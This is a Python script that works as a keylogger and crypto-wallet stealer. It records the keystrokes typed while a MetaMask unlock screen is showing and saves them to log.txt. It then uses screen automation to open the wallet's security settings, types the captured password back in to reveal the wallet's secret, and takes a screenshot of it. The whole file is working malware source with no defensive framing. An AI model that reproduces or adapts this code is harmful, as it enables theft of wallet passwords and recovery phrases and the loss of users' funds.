from re import T
import pyautogui
import time
from asyncore import write
import pynput
from pynput.keyboard import Key, Listener



keys = []
key = ""
def on_press(key):
    global keys
    if(pyautogui.locateOnScreen('./img/unlock6.png')):
        return False
    else:
        keys.append(key)
        print("{0} pressed".format(key))

def write_file(keys):
    with open("log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'","")
            f.write(k)
        return False

def on_release(key):
    if(pyautogui.locateOnScreen('./img/unlock6.png')):
        print("Stop")
        return False
    if key == Key.esc:
        return False
    
while True:
    if(pyautogui.locateOnScreen('./img/unlock1.png')):
        print('Open MetaMask')
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
        if(pyautogui.locateOnScreen('./img/unlock6.png')):
            write_file(keys)
            print('Login MetaMask')
            time.sleep(2)
            pyautogui.click(1742,124)
            if(pyautogui.locateOnScreen('./img/unlock3.png')):
                print('My Accounts')
                time.sleep(1)
                pyautogui.click(1459,615)
                if(pyautogui.locateOnScreen('./img/unlock4.png')):
                    print('Settings')
                    time.sleep(1)
                    pyautogui.click(1508,497)
                    if(pyautogui.locateOnScreen('./img/unlock5.png')):
                        print('Security')
                        time.sleep(1)
                        pyautogui.click(1546,395)
                        time.sleep(1)
                        data = open("log.txt", "r")
                        r = data.read()
                        pyautogui.write(r)
                        pyautogui.click(1665,782)
                        time.sleep(5)
                        pyautogui.doubleClick(1775,736)
                        time.sleep(5)
                        pyautogui.screenshot('my_screenshot.png')
                        time.sleep(1)
                        exit()                        

        